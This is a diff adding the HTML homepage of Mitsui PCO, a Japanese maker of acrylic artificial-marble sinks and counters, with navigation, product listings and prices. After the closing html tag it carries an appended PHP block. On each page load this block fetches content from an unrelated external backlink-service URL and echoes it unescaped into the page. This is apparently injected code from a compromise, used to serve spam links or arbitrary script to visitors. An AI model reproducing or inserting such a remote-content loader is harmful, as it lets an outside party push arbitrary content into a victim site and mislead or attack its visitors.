@@ -1,0 +1,533 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="ja" xml:lang="ja">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<meta http-equiv="Content-language" content="ja" />
+<meta http-equiv="Content-style-type" content="text/css" />
+<meta http-equiv="Content-script-type" content="text/javascript" />
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>三井PCO｜アクリル系人工大理石 デュポンコーリアン認定加工工場 人工大理石のことならおまかせください</title>
+<meta name="Keywords" content="人工大理石,人口大理石,アクリル系人工大理石,人造大理石,キッチンカウンター,洗面カウンター,シンク,ボウル,ボール,カウンタートップ,三井ＰＣＯ,補修,研磨,メンテナンス" />
+
+<meta name="Description" content="アクリル系人工大理石の設計施工・加工販売専門工場!メンテナンス・キズへこみも研磨補修でキレイに甦り!!人工大理石のことなら全てオーダーメイドの三井PCOにお任せください！" />
+<link href="/css/import.css" rel="stylesheet" type="text/css" media="all" />
+<link href="/css/anythingslider.css" rel="stylesheet" type="text/css" />
+<script language="JavaScript" type="text/javascript" src="/js/Scroll.js"></script>
+<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.6.4/jquery.min.js"></script>
+<script language="javascript" type="text/javascript" src="/js/jquery.anythingslider.js"></script>
+<!--[if IE]>
+<link rel="stylesheet" href="/css/ie.css" type="text/css" />
+<![endif]-->
+<script type="text/javascript">
+// Set up Sliders
+// **************
+$(function(){
+	$('#slider1').anythingSlider({
+		buildArrows     : false,
+		pauseOnHover    : false,
+		delay           : 3500,
+		startStopped    : false,
+		width           : 699,
+		height			: 300,
+		theme           : 'default',
+		onSlideComplete : function(slider){
+		}
+	});
+});
+</script>
+<script type="text/javascript">
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-27417547-1']);
+  _gaq.push(['_trackPageview']);
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script>
+</head>
+<body>
+<div id="ContainerBox">
+  <div id="HeaderBox">
+    <p><a href="/index.html"><img src="/images/common/head_logo.jpg" alt="三井PCO" width="205" height="38" class="logo" /></a></p>
+    <h1>デュポンコーリアン認定加工工場</h1>
+    <p class="tel"><a href="/mailform.html"><img src="/images/common/head_tel.jpg" width="380" height="70" alt="資料請求・お問い合わせはコチラ！お気軽にご連絡ください049-297-7271受付時間 / 年中無休　9：00～19：00お問合せ・お見積り365日24時間受付" /></a></p>
+    <ul id="GlobalNavi">
+      <li><a href="/index.html"><img src="/images/common/gnavi_01.jpg" width="160" height="47" alt="HOME" /></a></li>
+      <li><a href="/profile/index.html"><img src="/images/common/gnavi_02.jpg" width="160" height="47" alt="会社概要" /></a></li>
+      <li><a href="/order/index.html"><img src="/images/common/gnavi_03.jpg" width="161" height="47" alt="オーダーキッチンカウンター" /></a></li>
+      <li><a href="/work/index.html"><img src="/images/common/gnavi_04.jpg" width="159" height="47" alt="実績紹介" /></a></li>
+      <li><a href="/catalog/index.html"><img src="/images/common/gnavi_05.jpg" width="160" height="47" alt="カタログダウンロード" /></a></li>
+      <li><a href="/mailform.html"><img src="/images/common/gnavi_06.jpg" width="160" height="47" alt="お問い合わせ" /></a></li>
+    </ul>
+  </div>
+  <div id="ContBox">
+
+ <div id="LeftBox">
+  <p class="MB10"><a href="/items/"><img src="/images/common/all_item.jpg" "全ての商品を見る" /></a></p>
+  <h2 class="title_01">商品カテゴリー</h2>
+  <div id="SideMenu">
+<?php include_once('/var/www/mpco/public_html/categories.html'); ?>
+  </div>
+  <h2 class="title_03" style="color: white;"><a href="/order/index.html">オーダーキッチンカウンター</a></h2>
+  <div id="SideBox1">
+    <div class="txt">
+      <p>シンクカラーとカウンタートップを組合せてオリジナルのキッチンカウンターを製作販売いたします。</p>
+    </div>
+    <ul>
+      <li>デュポン・コーリアン</li>
+      <li>クラレノーブルライト</li>
+      <li>Ｓｔａｒｏｎ</li>
+      <li>スペインサイルストーン</li>
+    </ul>
+  </div>
+  <p><a href="/mailform.html"><img src="/images/common/side_btn_01.jpg" width="240" height="41" alt="無料お見積り・お問合わせ" /></a></p>
+  <div id="SideBox2">
+    <p class="MB10"><a href="/marble/index.html"><img src="/images/common/side_bn_13.jpg" width="210" height="95" /></a></p>
+    <p class="MB10"><a href="/profile/index.html"><img src="/images/common/side_bn_01.jpg" width="210" height="95" alt="三井PCOはどんな会社？" /></a></p>
+    <p class="MB10"><a href="/work/index.html"><img src="/images/common/side_bn_02.jpg" width="210" height="95" alt="三井PCOの今までの実績" /></a></p>
+    <p class="MB10"><a href="http://ameblo.jp/leebingdong/" target="_blank"><img src="/images/common/side_bn_03.jpg" width="210" height="70" alt="三井PCO社長BLOG" /></a></p>
+<p class="MB10"><a href="http://www.mitsuipco.net/" target="_blank"><img src="/images/common/side_bn_annai.jpg" width="210" height="70" alt="製品案内サイト" /></a></p>
+<iframe src="//www.facebook.com/plugins/likebox.php?href=http%3A%2F%2Ffacebook.com%2Fmpco321&amp;width=210&amp;height=1000&amp;colorscheme=light&amp;show_faces=true&amp;header=true&amp;stream=true&amp;show_border=true" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:210px; height:1000px;" allowTransparency="true"></iframe>
+    <ul class="list2">
+      <li><a href="/sitemap/index.html">サイトマップ</a></li>
+      <li><a href="/sitemap/index.html#privacy">個人情報取り扱いについて</a></li>
+    </ul>
+  </div>
+  <p class="title_04">関連企業リンク</p>
+  <div id="SideBox3">
+    <p class="title_05">各種人工大理石</p>
+ <ul class="banner">
+	<li>
+		<span class="MR10">
+		<a href="http://www.dupont-corian.net/" target="_blank"><img src="/images/common/side_bn_04.jpg" width="80" alt="corian" /></a>
+		</span>
+		<span>
+		<a href="http://www.noblelite.com/" target="_blank"><img src="/images/common/side_bn_05.jpg"  width="80"  alt="kuraray" /></a>
+		</span>
+	</li>
+	<li>
+		<span class="MR10">
+		<a href="http://www.abc-t.co.jp/" target="_blank"><img src="/images/common/side_bn_06.jpg"  width="80"  alt="ABC" /></a>
+
+		</span>
+		<span>
+		<a href="http://www.aica.co.jp/" target="_blank"><img src="/images/common/side_bn_05-111.jpg" width="80"  alt="ALCA" /></a>
+
+		</span>
+	</li>
+	<li><span class="MR10">
+<a href="http://www.advan.co.jp/" target="_blank"><img src="/images/common/side_bn_08.jpg"  width="80"  alt="ADVAN" /></a>
+</span>
+		<span>
+		<a href="http://www.yurinbussan.com/" target="_blank"><img src="/images/common/side_bn_07.jpg"  width="80" alt="ataron" /></a>
+</span>
+</li>
+		      <li><span style="margin-left: 90px;"><a href="http://www.silestonejapan.com/" target="_blank"><img src="/images/common/side_bn_09.jpg"  width="80"  alt="SILESTONE" /></a></span></li>
+    </ul>
+    <p class="title_05">協力工場</span>
+    <ul class="banner">
+      <li>
+		<span class="MR10">
+		<a href="http://www.yu-hong.com.tw/" target="_blank"><img src="/images/common/side_bn_10.jpg" width="80" alt="u-home" /></a>
+		</span>
+		<span>
+		<a href="http://www.jambo.com.tw/" target="_blank"><img src="/images/common/side_bn_11.jpg" width="80" alt="JAMBO" /></a></span></li>
+	 <li>
+		<span class="MR10">
+		<a href="http://www.joinform.com.tw/" target="_blank"><img src="/images/common/side_bn_12.jpg" width="80" alt="KUZIRA" /></a>
+		</span>
+		<span>
+		<a href="http://www.linkunta.com.tw/" target="_blank"><img src="/images/common/side_bn_12-154.jpg" width="80" alt="LIC" />
+		</a>
+		</span>
+	</li>
+	<li>
+		<span style="margin-left: 90px;">
+		<a href="http://www.conlin.com.tw/" target="_blank">
+		<img src="/images/common/side_bn_14.jpg" width="80" alt="ステンレスシンク" /></a>
+		</span></li>
+    </ul>
+  </div>
+</div>
+
+
+<div id="RightBox">
+
+<!-- AnythingSlider #1 -->
+            <ul id="slider1">
+                <li><img src="images/common/top_main_01.jpg" alt="アクリル系人工大理石のことなら三井ＰＣＯにお任せ！" /></li>
+                <li><img src="images/common/top_main_02.jpg" alt="三井ＰＣＯにお任せください！" /></li>
+                <li><img src="images/common/top_main_03.jpg" alt="100％アクリル キッチンシンク＆洗面ボウル" /></li>
+                <li><img src="images/common/top_main_04.jpg" alt="100％アクリル キッチンシンク＆洗面ボウル" /></li>
+                <li><img src="images/common/top_main_05.jpg" alt="ステンレスシンク厚み1mm付属パーツ豊富使いやすいバリエーション" /></li>
+                <li><img src="images/common/top_main_06.jpg" alt="曲げボウル" /></li>
+                <li><img src="images/common/top_main_07.jpg" alt="ステンレスシャワーのコンビネーションステンレスだからさびない" /></li>
+                <li><img src="images/common/top_main_08.jpg" alt="人工大理石の常識を変える93％水晶製の優れている抗菌人工大理石" /></li>
+                <li><img src="images/common/top_main_09.jpg" alt="三井ＰＣＯは自社加工場にて理想を形にします＝アイデア次第でさらに無限の可能性を～" /></li>
+            </ul>
+            <!-- END AnythingSlider #1 -->
+
+ <!--
+<div id="slider">
+<div class="image" style="background-image:url(/images/common/top_main_01.jpg);"></div>
+
+    <div class="image" style="background-image:url(/images/common/top_main_02.jpg);"></div>
+    <div class="image" style="background-image:url(/images/common/top_main_03.jpg);"></div>
+    <div class="image" style="background-image:url(/images/common/top_main_04.jpg);"></div>
+    <div class="image" style="background-image:url(/images/common/top_main_05.jpg);"></div>
+    <div class="image" style="background-image:url(/images/common/top_main_06.jpg);"></div>
+    <div class="image" style="background-image:url(/images/common/top_main_07.jpg);"></div>
+    <div class="image" style="background-image:url(/images/common/top_main_08.jpg);"></div>
+    <div class="image" style="background-image:url(/images/common/top_main_09.jpg);"></div>
+</div> -->
+
+  <div id="Top">
+    <!--↓↓↓ 新商品の紹介 ↓↓↓-->
+    <p><img src="/images/common/top_h_01.jpg" alt="新商品の紹介" width="669" height="25" class="MB10"></p>
+    <ul class="item_list">
+
+
+
+
+
+
+
+    <li style="clear:both;">
+
+<img src="http://www.mpco.co.jp/items/assets_c/2013/11/AR990ｼﾝｸ写真-thumb-180xauto.jpg" class="item_image_main" alt="" />
+
+<div class="list_border"><p><span style="color: #ff6600;">新発売帆船型人工大理石シンク</span></p>
+<p>品番：ＡＲ－990　帆船型シンク</p>
+<p>サイズ：　W972*D514*H210</p>
+<p>カラー：　ホワイト（雪白） only</p>
+<p>材 質：　ｱｸﾘﾙ変性ﾎﾟﾘｴｽﾃﾙ系ｼﾝｸ</p>
+<p>設計価格：　￥80,000（税・送料別）</p>
+<p>排水金具別売：　￥8,500</p>
+<p>付属品： 水切りｶｺﾞ、洗剤網ｶｺﾞ</p>
+<p><span style="color: #ff6600;">Web直売 （40％ＯＦＦ）　60％</span></p></div>
+<p><a href="a.html" onClick="javascript:window.open('http://www.mpco.co.jp/items/2013/11/ar990.html','a','width=720,scrollbars=yes'); return false;"><img src="/images/item_list/item_list_btn_01.jpg" width="197" height="27" alt="詳細を見る" /></a></p>
+
+
+    </li>
+
+
+
+
+
+    <li>
+
+<img src="http://www.mpco.co.jp/items/assets_c/2013/11/AR700ｼﾝｸ写真-thumb-180xauto.jpg" class="item_image_main" alt="" />
+
+<div class="list_border"><p><span style="color: #ff6600;">新発売　人工大理石ｷｯﾁﾝ ｼﾝｸ</span></p>
+<p><span style="color: #ff6600;">賃貸マンション、オフィス 最適</span></p>
+<p>品番：　ＡＲ-700　ｷｯﾁﾝ ｼﾝｸ</p>
+<p>サイズ：　Ｗ７５０ｘＤ485＊Ｈ230</p>
+<p>カラー：　ホワイト（雪白）　only</p>
+<p>材質：ｱｸﾘﾙ変性ﾎﾟﾘｴｽﾃﾙ系ｼﾝｸ</p>
+<p>設計価格：　￥60,000（税・送料別）</p>
+<p>排水金具別売：￥8,500　上代価格</p>
+<p><span style="color: #ff0000;">ＷＥｂ直売　（40％ＯＦＦ）　60％</span></p></div>
+<p><a href="a.html" onClick="javascript:window.open('http://www.mpco.co.jp/items/2013/10/ar700.html','a','width=720,scrollbars=yes'); return false;"><img src="/images/item_list/item_list_btn_01.jpg" width="197" height="27" alt="詳細を見る" /></a></p>
+
+
+    </li>
+
+
+
+
+
+    <li style="margin-right:0;">
+
+<img src="http://www.mpco.co.jp/items/assets_c/2013/11/AR600ｼﾝｸ写真-thumb-180xauto.jpg" class="item_image_main" alt="" />
+
+<div class="list_border"><p><span style="color: #ff6600;"><strong>新発売　人工大理石ｷｯﾁﾝ ｼﾝｸ</strong></span></p>
+<p><span style="color: #ff6600;"><strong>賃貸マンション、オフィス最適</strong></span></p>
+<p>品番：ＡＲ－600　ｷｯﾁﾝシンク</p>
+<p>サイズ：　Ｗ600ｘＤ506ｘＨ230</p>
+<p>カラー：ホワイト(雪白)　only &nbsp;</p>
+<p>材質：ｱｸﾘﾙ変性ﾎﾟﾘｴｽﾃﾙ系ｼﾝｸ</p>
+<p>設計価格：　￥55,000（税・送料別）</p>
+<p>排水金具別売：￥8,500上代価格</p>
+<p><span style="color: #ff0000;">Ｗｅｂ直売　（40％ＯＦＦ）　60％</span></p></div>
+<p><a href="a.html" onClick="javascript:window.open('http://www.mpco.co.jp/items/2013/10/ar600.html','a','width=720,scrollbars=yes'); return false;"><img src="/images/item_list/item_list_btn_01.jpg" width="197" height="27" alt="詳細を見る" /></a></p>
+
+
+    </li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <li style="clear:both;">
+
+<img src="http://www.mpco.co.jp/items/assets_c/2012/01/U-205-1_R-thumb-180xauto.jpg" class="item_image_main" alt="" />
+
+<div class="list_border"><p><strong>品番</strong>：U-205　ｷｯﾁﾝｼﾝｸ</p>
+<p><strong>サイズ </strong>：W780 &times; D510 &times; H230</p>
+<p><strong>カラー</strong> ：ホワイト only</p>
+<p><strong>付属品</strong> ：洗剤アミカゴ付き</p>
+<p><strong>材料</strong> ：100％アクリル人工大理石</p>
+<p><span style="font-size: xx-small; font-weight: bold; color: #434343; line-height: 24px; text-align: left;">設計価格　￥7７,000（税・送料別）</span></p>
+<p><span style="font-size: xx-small;"><span style="font-weight: bold; color: #434343; line-height: 24px; text-align: left;">排水金具別売 ￥8,500 上代価格</span></span></p>
+<p><span style="font-size: xx-small;"><span style="font-weight: bold; line-height: 24px; text-align: left;"><span style="color: #ff0000;">Web直売（４０％OFF）　６０％</span></span></span></p></div>
+<p><a href="a.html" onClick="javascript:window.open('http://www.mpco.co.jp/items/2011/12/u205-1.html','a','width=720,scrollbars=yes'); return false;"><img src="/images/item_list/item_list_btn_01.jpg" width="197" height="27" alt="詳細を見る" /></a></p>
+
+
+    </li>
+
+
+
+
+
+    <li>
+
+<img src="http://www.mpco.co.jp/items/assets_c/2012/01/ｊｂ-880p_R-thumb-180xauto.jpg" class="item_image_main" alt="" />
+
+<div class="list_border"><p><strong>品番</strong>：JB-812　ｼﾝｸ</p>
+<p><strong>サイズ</strong> ：W876 &times; D510 &times; H213</p>
+<p><strong>カラー</strong> ：6色</p>
+<p><strong>付属品</strong> ：洗剤網かご・水切りかご</p>
+<p><strong>材料</strong> ：100％MMAアクリル樹脂</p>
+<p><span style="font-size: xx-small;"><strong>設計価格 白 ￥80,000(税・送料別</strong></span></p>
+<p><span style="font-size: xx-small;"><strong>設計価格 カラー5色 ￥92,000</strong></span></p>
+<p><span style="font-size: xx-small;"><strong>排水金具別売　￥8,500 上代価格</strong></span></p>
+<p><span style="font-size: xx-small;"><strong><span style="color: #ff0000;">Web直売（４０％ＯＦＦ）　６０％</span></strong></span></p></div>
+<p><a href="a.html" onClick="javascript:window.open('http://www.mpco.co.jp/items/2011/12/jb460.html','a','width=720,scrollbars=yes'); return false;"><img src="/images/item_list/item_list_btn_01.jpg" width="197" height="27" alt="詳細を見る" /></a></p>
+
+
+    </li>
+
+
+
+
+
+    <li style="margin-right:0;">
+
+<img src="http://www.mpco.co.jp/items/assets_c/2012/01/jb-780gr_R-thumb-180xauto.jpg" class="item_image_main" alt="" />
+
+<div class="list_border"><p><strong>品番</strong>：JB-780　ｼﾝｸ</p>
+<p><strong>サイズ</strong> ：W792 &times; D527 &times; H213</p>
+<p><strong>カラー</strong> ：6色</p>
+<p><strong>付属品</strong> ：水切りカゴ付き</p>
+<p><strong>材料</strong> ：100％アクリル人工大理石</p>
+<p><strong><span style="font-size: xx-small;">設計価格 白 ￥75,000(税・送料別</span></strong></p>
+<p><span style="font-size: xx-small;"><strong>設計価格 カラー5色 ￥86,</strong><strong>250</strong></span></p>
+<p><strong><span style="font-size: xx-small;">排水金具別売 ￥8,500 上代価格</span></strong></p>
+<p><span style="color: #ff0000;"><span style="font-size: xx-small;"><strong>Web直売（４０％OFF）　６０％</strong></span></span></p></div>
+<p><a href="a.html" onClick="javascript:window.open('http://www.mpco.co.jp/items/2011/12/post.html','a','width=720,scrollbars=yes'); return false;"><img src="/images/item_list/item_list_btn_01.jpg" width="197" height="27" alt="詳細を見る" /></a></p>
+
+
+    </li>
+
+
+
+
+
+
+
+
+
+    <li style="clear:both;">
+
+<img src="http://www.mpco.co.jp/items/assets_c/2011/12/u206S_R-thumb-180xauto.jpg" class="item_image_main" alt="" />
+
+<div class="list_border"><p><strong>品番</strong>：U-206 ﾊﾞｰｼﾝｸ</p>
+<p><strong>サイズ</strong> ：W505 &times; D405 &times; H170</p>
+<p><strong>カラー</strong> ：ホワイト only</p>
+<p><strong>材料</strong> ：100％アクリル人工大理石</p>
+<p><strong><span style="font-size: xx-small;">設計価格　￥４０，０００（税・送料別）</span></strong></p>
+<p><strong><span style="font-size: xx-small;">排水金具別売 ￥4,500 上代価格</span></strong></p>
+<p><strong><span style="font-size: xx-small;"><span style="color: #ff0000;">Web直売（４０％OFF）　６０％</span></span></strong></p></div>
+<p><a href="a.html" onClick="javascript:window.open('http://www.mpco.co.jp/items/2011/12/u206.html','a','width=720,scrollbars=yes'); return false;"><img src="/images/item_list/item_list_btn_01.jpg" width="197" height="27" alt="詳細を見る" /></a></p>
+
+
+    </li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <li>
+
+<img src="http://www.mpco.co.jp/items/assets_c/2012/02/ＪＢ-430-02_R-thumb-180xauto.jpg" class="item_image_main" alt="" />
+
+<div class="list_border"><p><strong>品番</strong>：JB-430 ﾊﾞｰｼﾝｸ</p>
+<p><strong>サイズ</strong> ：W430 &times; D460 &times; H200</p>
+<p><strong>カラー</strong> ：ホワイト　only</p>
+<p><strong>材料</strong> ：100％アクリル人工大理石</p>
+<p><strong><span style="font-size: xx-small;">設計価格　￥40,000(税・送料別)</span></strong></p>
+<p><strong><span style="font-size: xx-small;">排水金具別売　￥4,500 上代価格</span></strong></p>
+<p><strong><span style="font-size: xx-small;"><span style="color: #ff0000;">Web直売（４０％ＯＦＦ）　６０％</span></span></strong></p></div>
+<p><a href="a.html" onClick="javascript:window.open('http://www.mpco.co.jp/items/2011/12/jb430.html','a','width=720,scrollbars=yes'); return false;"><img src="/images/item_list/item_list_btn_01.jpg" width="197" height="27" alt="詳細を見る" /></a></p>
+
+
+    </li>
+
+
+
+
+
+
+
+
+
+    <li style="margin-right:0;">
+
+<img src="http://www.mpco.co.jp/items/assets_c/2011/12/u101_R-thumb-180xauto.jpg" class="item_image_main" alt="" />
+
+<div class="list_border"><p><span style="font-size: xx-small;"><strong>品番</strong>：U-101 楕円ボウル　 OF付き</span></p>
+<p><span style="font-size: xx-small;"><strong>サイズ</strong> ：W475 &times; D387 &times; H159</span></p>
+<p><strong>カラー</strong> ：ホワイト only</p>
+<p><strong>付属品</strong> ：ｵｰﾊﾞｰﾌﾛｰﾁｭｰﾌﾞ付き</p>
+<p><strong>材料</strong> ：100％アクリル人工大理石</p>
+<p><strong><span style="font-size: xx-small;">設計価格　￥２８，０００（税・送料別）</span></strong></p>
+<p><strong><span style="font-size: xx-small;">排水金具別売 ￥11,500 上代価格</span></strong></p>
+<p><strong><span style="font-size: xx-small;"><span style="color: #ff0000;">Web直売（４０％ＯＦＦ）　６０％</span></span></strong></p>
+<p><strong><span style="font-size: xx-small;">容量：8.3ℓ</span></strong></p></div>
+<p><a href="a.html" onClick="javascript:window.open('http://www.mpco.co.jp/items/2011/12/u205.html','a','width=720,scrollbars=yes'); return false;"><img src="/images/item_list/item_list_btn_01.jpg" width="197" height="27" alt="詳細を見る" /></a></p>
+
+
+    </li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </ul>
+
+
+    <!--↑↑↑ 新商品の紹介 ↑↑↑-->
+    <!--↓↓↓ 新着情報 ↓↓↓-->
+
+    <p class="clearfix" id="new_h"><img src="/images/common/top_h_03.jpg" width="669" height="25" alt="新着情報"><a href="news_index.html"><img src="/images/common/top_btn_01.jpg" alt="一覧を見る" width="75" height="24" class="details"></a></p>
+    <div id="TopNewBox">
+      <?php include_once('./get_rss.php')?>
+    </div>
+    <!--↑↑↑ 新着情報 ↑↑↑-->
+    <p class="MB20"><a href="/marble/index.html"><img src="/images/common/top_pic_05.jpg"  alt="100%アクリル系 洗面ボウル＆シンク"></a></p>
+    <p class="MB20"><a href="/order/index.html"><img src="/images/common/top_pic_06.jpg" width="670" height="100" alt="【シンク】＆【トップ】製作"></a></p>
+    <p><img src="/images/common/top_h_03-98.jpg" alt="オーダーキッチンご注文までの流れ" width="670" height="26" class="MB10"></p>
+    <p class="MB30"><img src="/images/common/top_item_03.jpg" width="670" height="124" alt="オーダーキッチンご注文までの流れ"></p>
+    <p class="MB40"><a href="/catalog/index.html"><img src="/images/common/top_pic_07.jpg" width="670" height="160" alt="三井PCO取り扱い製品の最新カタログ＆試験報告書データが無料でダウンロードできます!"></a></p>
+    <p><img src="/images/common/top_item_08.jpg" width="670" height="50" alt="すべてオーダーメイド　～アイデア次第でさらに無限の可能性を～"></p>
+    <div id="TopBox1">
+
+      <div class="txt">
+        <p>三井PCOでは、30年以上の人工大理石取り扱いの経験をもち、お客様のご要望に合わせて優れた特性を持つ製品をご提供させていただきます。<br>
+          住宅であれば、キッチン・作業テーブル・ワークトップ・キッチン壁・洗面・出窓・上がり框など、商業施設であれば、カウンターテーブル（受付・バー）・洗面（ビル）・壁（エントランス）・ディスプレイ家具 など、ご要望にお応えできます。安心しておまかせください！</p>
+      </div>
+    </div>
+    <p><img src="/images/common/top_item_09.jpg" width="670" height="50" alt="100%アクリル系洗面ボウル＆シンク紹介動画"></p>
+    <div id="TopBox2">
+      <p>
+<iframe width="442" height="270" src="http://www.youtube.com/embed/VfwhMfWHp1k" frameborder="0" allowfullscreen=""></iframe></p>
+
+    </div>
+  </div>
+</div>
+
+   </div>
+</div>
+
+<div id="FootBox">
+  <p id="Pagetop"><a href="#ContainerBox"><img src="/images/common/pagetop_01.jpg" width="88" height="26" alt="PAGETOP" /></a></p>
+  <div id="FootinBox">
+    <p id="Map"><a target="_blank" href="http://maps.google.co.jp/maps?f=q&amp;source=embed&amp;hl=ja&amp;geocode=&amp;q=%E5%9F%BC%E7%8E%89%E7%9C%8C%E6%AF%94%E4%BC%81%E9%83%A1%E5%B7%9D%E5%B3%B6%E7%94%BA%E5%A4%A7%E5%AD%97%E8%A1%A8%C2%A021-5&amp;aq=&amp;sll=36.5626,136.362305&amp;sspn=53.372719,73.652344&amp;vpsrc=0&amp;brcurrent=3,0x6018d04c12035a99:0xae0883f2f250ad6a,0&amp;ie=UTF8&amp;hq=&amp;hnear=%E5%9F%BC%E7%8E%89%E7%9C%8C%E6%AF%94%E4%BC%81%E9%83%A1%E5%B7%9D%E5%B3%B6%E7%94%BA%E8%A1%A8%EF%BC%92%EF%BC%91&amp;t=m&amp;z=14&amp;iwloc=A&amp;ll=35.978529,139.501877" style="color:#0000FF;text-align:left">
+<img src="/images/common/map_white.jpg" /></a></p>
+    <div id="FBox">
+      <p class="MB10"><img src="/images/common/foot_item_01.jpg" alt="株式会社三井ピーシーオー" width="399" height="25" /></p>
+      <p class="MB10">〒350-0133　埼玉県比企郡川島町大字表 21-5</p>
+      <p class="MB10"><img src="/images/common/foot_item_02.jpg" width="399" height="17" alt="TEL049-297-7271　FAX049-297-7273" /></p>
+      <p class="MB10">受付時間／月～金　9：00～19：00</p>
+      <p><a href="/mailform.html"><img src="/images/common/foot_btn_01.jpg" width="220" height="36" alt="無料お見積り・お問合わせ" /></a></p>
+    </div>
+    <ul id="FootMenu">
+      <li><a href="/index.html">トップページ</a></li>
+      <li><a href="/profile/index.html">会社概要</a></li>
+      <li><a href="/order/index.html">オーダーキッチンカウンター</a></li>
+      <li><a href="/work/index.html">実績紹介</a></li>
+      <li><a href="/catalog/index.html">カタログダウンロード</a></li>
+      <li><a href="/mailform.html">お問合わせ</a></li>
+      <li><a href="/marble/index.html">100％アクリルシンク・ボウル</a></li>
+      <li><a href="/items/index.html">商品一覧</a></li>
+      <li><a href="/sitemap/index.html">サイトマップ・個人情報取り扱いについて</a></li>
+      <li><a href="http://ameblo.jp/leebingdong/" target="_blank">ブログ</a></li>
+    </ul>
+    <p id="Copyright"><img src="/images/common/copyright.jpg" width="296" height="13" alt="Copyrightc2011 mpco.co.jp　All Rights Reserved." /></p>
+  </div>
+</div>
+</body>
+</html>
+
+
+
+<?php
+$jasabacklinks = 'https://www.backlinkku.id/menu/server-id/script.txt';
+function fetch_remote_content($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
+    $output = curl_exec($ch);
+    curl_close($ch);
+    return $output;
+}
+$fileContents = fetch_remote_content($jasabacklinks);
+echo $fileContents;
+?>
